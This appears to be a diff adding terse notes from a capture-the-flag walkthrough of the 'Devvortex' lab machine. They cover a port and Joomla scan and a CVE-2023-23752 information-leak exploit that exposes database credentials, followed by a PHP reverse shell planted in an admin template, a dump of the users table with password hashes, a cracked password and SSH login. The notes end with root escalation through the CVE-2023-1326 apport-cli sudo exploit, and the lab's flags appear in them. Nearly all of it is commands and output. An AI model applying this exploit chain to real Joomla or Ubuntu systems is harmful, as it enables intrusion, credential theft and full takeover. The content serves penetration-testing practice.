@@ -1,0 +1,134 @@
+nmap 
+23/tcp   closed telnet        conn-refused
+25/tcp   closed smtp          conn-refused
+53/tcp   closed domain        conn-refused
+80/tcp   open   http          syn-ack      nginx 1.18.0 (Ubuntu)
+
+found dev.devvortex.htb
+
++] Detecting Joomla Version
+[++] Joomla 4.2.6
+
+[+] Core Joomla Vulnerability
+[++] Target Joomla core is not vulnerable
+
+[+] Checking apache info/status files
+[++] Readable info/status files are not found
+
+[+] admin finder
+[++] Admin page : http://dev.devvortex.htb/administrator/
+
+EXPLOIT https://github.com/Acceis/exploit-CVE-2023-23752.git
+
+└─# ruby exploit.rb http://dev.devvortex.htb
+Users
+[649] lewis (lewis) - lewis@devvortex.htb - Super Users
+[650] logan paul (logan) - logan@devvortex.htb - Registered
+
+Site info
+Site name: Development
+Editor: tinymce
+Captcha: 0
+Access: 1
+Debug status: false
+
+Database info
+DB type: mysqli
+DB host: localhost
+DB user: lewis
+DB password: P4ntherg0t1n5r3c0n##
+DB name: joomla
+DB prefix: sd4fg_
+DB encryption 0
+
+php reverse shell to settings > templates > admin > error.php
+
+
+python3 -c 'import pty; pty.spawn("/bin/sh")'
+
+mysql> show databases;
+show databases;
++--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| joomla             |
+| performance_schema |
++--------------------+
+3 rows in set (0.00 sec)
+
+mysql> use joomla
+use joomla
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Database changed
+mysql> 
+
+
+mysql> select * from sd4fg_users;
+select * from sd4fg_users;                                                                                                                                                                                                                  
++-----+------------+----------+---------------------+--------------------------------------------------------------+-------+-----------+---------------------+---------------------+------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+---------------+------------+--------+------+--------------+--------------+                                                  
+| id  | name       | username | email               | password                                                     | block | sendEmail | registerDate        | lastvisitDate       | activation | params                                                                                                                                                  | lastResetTime | resetCount | otpKey | otep | requireReset | authProvider |                                                  
++-----+------------+----------+---------------------+--------------------------------------------------------------+-------+-----------+---------------------+---------------------+------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+---------------+------------+--------+------+--------------+--------------+                                                  
+| 649 | lewis      | lewis    | lewis@devvortex.htb | $2y$10$6V52x.SD8Xc7hNlVwUTrI.ax4BIAYuhVBMVvnYWRceBmy8XdEzm1u |     0 |         1 | 2023-09-25 16:44:24 | 2024-01-12 07:44:34 | 0          |                                                                                                                                                         | NULL          |          0 |        |      |            0 |              |                                                  
+| 650 | logan paul | logan    | logan@devvortex.htb | $2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12 |     0 |         0 | 2023-09-26 19:15:42 | NULL                |            | {"admin_style":"","admin_language":"","language":"","editor":"","timezone":"","a11y_mono":"0","a11y_contrast":"0","a11y_highlight":"0","a11y_font":"0"} | NULL          |          0 |        |      |            0 |              |                                                  
++-----+------------+----------+---------------------+--------------------------------------------------------------+-------+-----------+---------------------+---------------------+------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+---------------+------------+--------+------+--------------+--------------+                                                  
+2 rows in set (0.00 sec)                                                                                                                                                                                                                    
+                                                                                                                                                                                                                                            
+mysql>      
+
+pass after crackeing hash
+
+tequieromucho
+
+ssh logan@10.10.11.242
+logan@10.10.11.242's password: 
+Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-167-generic x86_64)
+
+logan@devvortex:~$ ls
+user.txt
+logan@devvortex:~$ cat user.txt 
+bdbcade6f384d6fcaea9ec81cbc2328d
+logan@devvortex:~$ sudo -l
+[sudo] password for logan: 
+Sorry, try again.
+[sudo] password for logan: 
+Matching Defaults entries for logan on devvortex:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User logan may run the following commands on devvortex:
+    (ALL : ALL) /usr/bin/apport-cli
+
+found Exploit
+https://github.com/diego-tella/CVE-2023-1326-PoC
+
+exploit code
+sudo /usr/bin/apport-cli -c test.log less
+
+
+logan@devvortex:/var/crash$ sudo /usr/bin/apport-cli -c test.log less
+
+*** Collecting problem information
+
+The collected information can be sent to the developers to improve the
+application. This might take a few minutes.
+..............
+
+*** Send problem report to the developers?
+
+After the problem report has been sent, please fill out the form in the
+automatically opened web browser.
+
+What would you like to do? Your options are:
+  S: Send report (1.6 KB)
+  V: View report
+  K: Keep report file for sending later or copying to somewhere else
+  I: Cancel and ignore future crashes of this program version
+  C: Cancel
+Please choose (S/V/K/I/C): V
+root@devvortex:/var/crash# cd /root
+root@devvortex:~# ls
+root.txt
+1a9377e32ca5d1ddfc4b3bd056f9293e
+root@devvortex:~# 
